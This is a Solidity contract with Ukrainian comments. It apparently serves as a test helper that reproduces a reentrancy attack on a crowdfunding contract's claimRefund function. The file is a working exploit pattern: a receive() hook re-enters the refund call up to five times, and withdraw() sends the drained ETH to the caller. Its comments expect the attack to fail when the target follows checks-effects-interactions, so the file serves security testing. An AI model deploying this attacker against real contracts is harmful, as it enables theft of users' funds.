// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../interfaces/ICrowdfunding.sol";

/// @title ReentrancyAttacker
/// @notice Шкідливий смарт-контракт для демонстрації та відтворення атаки повторного входу (Reentrancy)
contract ReentrancyAttacker {
    ICrowdfunding public immutable target;
    uint256 public targetCampaignId;
    uint256 public attackCount;
    bool public attackSuccess;

    event AttackAttempted(uint256 count);

    constructor(address _target) {
        target = ICrowdfunding(_target);
    }

    /// @notice Здійснити внесок у кампанію від імені контракту-атакувальника
    /// @param campaignId Ідентифікатор кампанії
    function deposit(uint256 campaignId) external payable {
        targetCampaignId = campaignId;
        target.pledge{value: msg.value}(campaignId);
    }

    /// @notice Запуск атаки повторного входу через claimRefund
    function triggerRefundAttack() external {
        attackCount = 0;
        attackSuccess = false;
        target.claimRefund(targetCampaignId);
    }

    /// @notice Функція перехоплення вхідного ETH (хук повторного входу)
    receive() external payable {
        attackCount++;
        emit AttackAttempted(attackCount);

        // Спроба повторного входу, поки на балансі цілі є кошти
        if (address(target).balance >= msg.value && attackCount < 5) {
            // Намагаємося повторно викликати повернення коштів до завершення попереднього виклику
            try target.claimRefund(targetCampaignId) {
                attackSuccess = true;
            } catch {
                // Якщо спрацював CEI, повторний вхід буде відхилено з NoContribution
                attackSuccess = false;
            }
        }
    }

    /// @notice Виведення коштів зловмисником
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
